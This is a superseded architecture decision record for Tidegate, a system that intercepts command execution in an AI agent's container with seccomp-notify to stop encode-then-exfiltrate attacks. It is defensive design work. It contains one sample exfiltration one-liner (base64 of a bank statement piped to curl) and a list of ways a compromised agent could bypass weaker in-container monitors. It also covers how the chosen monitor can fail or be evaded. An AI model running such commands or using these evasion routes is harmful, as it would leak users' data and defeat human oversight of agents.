---
artifact: ADR-001
title: "OCI Runtime Wrapper + seccomp-notify for L1 Command Interception"
status: Superseded
author: cristos
created: 2026-02-22
last-updated: 2026-02-23
affected-artifacts:
  - VISION-001
  - ADR-002
linked-epics: []
linked-specs: []
depends-on: []
---
# ADR-001: OCI Runtime Wrapper + seccomp-notify for L1 Command Interception

## Lifecycle

| Phase | Date | Commit | Notes |
|-------|------|--------|-------|
| Proposed | 2026-02-22 | 138d920 | Evaluated shell wrapper, eBPF LSM, Tetragon, fanotify |
| Adopted | 2026-02-22 | 138d920 | Adopted seccomp-notify + OCI runtime wrapper |
| Superseded | 2026-02-23 | 94efd00 | By ADR-002. execve interception and command evaluator dropped. seccomp-notify mechanism retained for `connect()` enforcement in journal-based taint architecture. |

> **This ADR is superseded.** The seccomp-notify mechanism survived but the application changed fundamentally: `connect()` interception with journal-based taint tracking replaces `execve` interception with command evaluation. See [ADR-002](../Accepted/(ADR-002)-Taint-and-Verify-Data-Flow-Model.md) for the current L1 design.
>
> Key reasons for supersession:
> - The command evaluator (script parsing, glob resolution, encoding pattern detection) was the most complex planned component — and its value depended on static analysis, which is weak when tg-scanner is OSS (detection vocabulary is public).
> - The journal architecture (eBPF `openat` observation + scanner daemon + seccomp-notify `connect()` enforcement) covers the encryption gap via runtime taint tracking, without static analysis.
> - Sabotage prevention (the other use case for `execve` blocking) is handled by containerization + mounted dirs + backups, not command validation.

## Context

Tidegate's Layer 1 catches encryption-before-exfiltration — the attack where a skill reads sensitive data, encodes it, and sends the encoded blob through an allowed channel, defeating pattern-based scanning at Layers 2 and 3. L1 is load-bearing: without it, `base64 < bank_statement.csv | curl https://allowed-api.com -d @-` bypasses all network-layer scanning.

L1 needs to:
1. Intercept every command execution in the agent container
2. Identify referenced files and script sources
3. Scan file contents for sensitive data
4. Analyze command/script for encoding and exfiltration patterns
5. Block execution if sensitive data would be encoded or exfiltrated

The critical design constraint: **the agent container is hostile territory**. A compromised agent can tamper with anything running inside its container. All trust-critical logic must run outside the agent container.

### The scanner interface

Tidegate's scanner has a single interface: `{value} -> {allow, reason}`. It has no filesystem access, no network access, no side effects. The same scanner serves all callers (MCP gateway, agent-proxy, and now the command evaluator). The command evaluator is a new process that understands commands and orchestrates scanner calls — it is a peer to the scanner, not a replacement.

## Decision

Use a **custom OCI runtime wrapper** that injects **seccomp-notify** (`SECCOMP_RET_USER_NOTIF`) on `execve` syscalls, with a **tg-scanner container** as the notification listener. No executable code runs inside the agent container for L1 enforcement.

### Architecture

```
containerd calls "runc create" with OCI bundle
       |
       v
tidegate-runtime (thin OCI wrapper)
  |-- reads config.json from the bundle
  |-- injects seccomp section:
  |     "listenerPath": "/run/tg-scanner/seccomp.sock"
  |     syscalls: [{ action: "SCMP_ACT_NOTIFY", names: ["execve", "execveat"] }]
  |-- passes modified bundle to real runc
       |
       v
runc installs seccomp filter in kernel, sends notification fd
to tg-scanner via Unix socket (SCM_RIGHTS)
```

At runtime:

```
Process in agent container calls execve()
       |
       v
Kernel seccomp filter: SECCOMP_RET_USER_NOTIF
  (thread is PAUSED, syscall has not executed)
       |
       v  notification fd
tg-scanner container (on agent-net)
  |-- reads execve args from /proc/<pid>/mem
  |-- command evaluator:
  |     A) parses command syntax (encoding/exfil patterns)
  |     B) resolves file references (globs, args, script source)
  |     C) reads referenced files from shared read-only volume
  |     D) sends file contents to scanner (value -> allow/deny)
  |     E) correlates: sensitive files + dangerous command -> verdict
  |-- responds ALLOW or DENY
       |
       v
Kernel: execve proceeds or returns EPERM
```

### Container topology

```
agent container (agent-net, internal)
  |-- workspace mounted at /workspace (read-write)
  |-- NO L1 executable, no shell wrapper, no shim
  |-- seccomp filter installed by kernel at container creation
  |-- cannot modify or bypass the filter from userspace

tg-scanner container (agent-net)
  |-- workspace mounted at /workspace (READ-ONLY)
  |-- listens on /run/tg-scanner/seccomp.sock
  |-- runs:
  |     command evaluator (new process, understands commands)
  |     scanner (existing process, value -> allow/deny)
  |-- reads files independently from shared volume
  |-- makes all trust-critical decisions
```

### How file scanning works

tg-scanner has its own read-only mount of the workspace. When it intercepts an execve:

1. Reads the command and arguments from `/proc/<pid>/mem`
2. Reads the script source from the shared volume (e.g., `script.py`)
3. Analyzes the script for file discovery patterns (e.g., `glob.glob("**/*.csv")`)
4. Resolves those patterns against the shared volume — same directory tree
5. Reads and scans the discovered files
6. Analyzes the script for encoding/exfiltration patterns (`base64`, `urllib`, etc.)
7. Correlates: sensitive files reachable by script + encoding/exfil intent -> deny

The wrapper doesn't read files and send them — tg-scanner reads them directly. The agent container cannot influence what tg-scanner reads.

## Alternatives Considered

### Shell wrapper replacing /bin/sh (Go binary, in-container)

A static Go binary replaces `/bin/sh` in the agent container. Intercepts commands, forwards to tg-scanner, waits for verdict.

**Rejected because**: A motivated agent can bypass it via direct `execve()` calls from Python (`os.execv`), Node.js (`child_process.execFileSync`), calling alternate shells (`/bin/bash`, `/bin/dash`), writing binaries to tmpfs, or `memfd_create` + `fexecve`. The wrapper only intercepts commands that go through `/bin/sh` — any code running in the container can call `execve` directly on any binary.

seccomp-notify intercepts the `execve` *syscall*, catching all of these bypass vectors. The interception is in the kernel, not in userspace.

### eBPF / BPF LSM (bprm_check_security)

Attach an eBPF program to the `bprm_check_security` LSM hook. TOCTOU-free (hooks fire on kernel-resolved file objects, not user-space pointers). Theoretically the best mechanism.

**Rejected because**: Docker Desktop's LinuxKit kernel lacks `CONFIG_BPF_LSM` (and likely `CONFIG_SECURITY`). Would not work on macOS. No path to enabling it without building a custom LinuxKit kernel. Works on production Linux hosts but breaks the "works on both Linux and macOS" requirement.

### Tetragon (kprobe + SIGKILL/Override)

Deploy Tetragon as a privileged container. Block specific binaries via TracingPolicy YAML. Production-ready CNCF project.

**Rejected as primary mechanism because**: Can only make static policy decisions ("block `base64` always"), not per-invocation content-aware decisions ("block `base64` if the input file contains credit cards"). Cannot synchronously consult a userspace service for each execve. Has TOCTOU on kprobe hooks (same as seccomp-notify).

**May be adopted as defense-in-depth**: Hard-block known-dangerous binaries (nc, ncat, socat) as an unconditional outer fence, complementing the seccomp-notify content-aware gating.

### fanotify FAN_OPEN_EXEC_PERM

Generates a permission event before a file is opened for execution. The monitoring process responds ALLOW or DENY.

**Rejected because**: Docker Desktop's LinuxKit kernel lacks `CONFIG_FANOTIFY_ACCESS_PERMISSIONS`. Same macOS incompatibility as BPF LSM. Additionally, fanotify only shows which binary is being executed, not the command arguments — insufficient for content-aware analysis.

### seccomp-notify without OCI runtime wrapper

Use Docker's built-in seccomp profile support to set `SCMP_ACT_NOTIFY`.

**Not viable**: Docker's seccomp profile JSON format does not expose the `listenerPath` or `listenerMetadata` fields from the OCI runtime spec. runc supports these fields (v1.1.0+), but Docker/containerd do not pass them through. The OCI runtime wrapper solves this by injecting the fields into config.json before passing to runc.

## Consequences

### Positive

- **Zero code in agent container**: No executable to tamper with, bypass, or kill. The seccomp filter is installed by the kernel and cannot be removed from userspace.
- **Catches all execve vectors**: Direct syscalls, alternate shells, binaries on tmpfs, `memfd_create` — everything goes through the kernel's execve path.
- **Content-aware gating**: tg-scanner reads files independently from the shared volume, analyzes scripts for encoding/exfil patterns, resolves file discovery patterns (globs), and makes informed allow/deny decisions.
- **Clean separation**: The scanner stays simple (`{value} -> {allow/deny}`). The command evaluator is a new peer process that understands commands and orchestrates scanner calls. Both run in tg-scanner, outside the blast radius.
- **Works on macOS**: runc runs inside Docker Desktop's LinuxKit VM. The OCI runtime wrapper and tg-scanner both run inside the VM. seccomp-notify has been supported since kernel 5.0; LinuxKit ships 5.15+.

### Negative

- **Custom OCI runtime wrapper**: Requires building and maintaining a thin wrapper around runc. Not complex (~50 lines to inject config fields and delegate), but it's non-standard infrastructure that must be distributed with Tidegate.
- **TOCTOU on pointer arguments**: Another thread in the agent container could modify the execve pathname in memory between when tg-scanner reads it and when the kernel uses it (if tg-scanner responds ALLOW). Mitigated by: agent processes are typically single-threaded; the window is narrow; `SECCOMP_IOCTL_NOTIF_ID_VALID` validates notification currency.
- **Fail-open on tg-scanner crash**: If tg-scanner dies, pending syscalls get `ENOSYS` and future intercepted syscalls fail open. Must be mitigated with a hard seccomp-bpf fallback filter that kills the container if the listener disconnects.
- **Reading /proc/<pid>/mem**: tg-scanner reads syscall arguments from the agent container's process memory. Requires appropriate access (host PID namespace or shared PID namespace between containers).
- **No production precedent for execve gating**: All existing seccomp-notify deployments (LXD, Sysbox, CRI-O) use it for syscall emulation, not command policy enforcement. Tidegate would be the first.

### Requirements

| Component | Minimum Version |
|---|---|
| Linux kernel | 5.9+ (for `SECCOMP_USER_NOTIF_FLAG_CONTINUE`) |
| runc | 1.1.0+ (seccomp-notify + `listenerPath` support) |
| Docker | >= 25.0.5 (CVE-2024-29018 fix, ships runc 1.1+) |
| Docker Desktop | Recent version with kernel 5.15+ linuxkit |
| libseccomp | 2.5.0+ (for `SCMP_ACT_NOTIFY`) |

### Residual risks

1. **TOCTOU on execve arguments**: Narrow window, mitigated by single-threaded agent processes and notification validity checks. Accepted risk.
2. **Dynamically constructed scripts**: A script that uses `eval()`/`exec()` to hide its intent. Mitigated by: tg-scanner flags `eval`/`exec`/`compile` as suspicious patterns.
3. **Operations entirely within an already-approved process**: A Python process approved at execve time that subsequently discovers new files. Mitigated by: script source analysis at execve time catches encoding + file I/O patterns; L2/L3 catch the outbound network request.
4. **Fail-open on tg-scanner crash**: Mitigated by seccomp-bpf fallback filter.
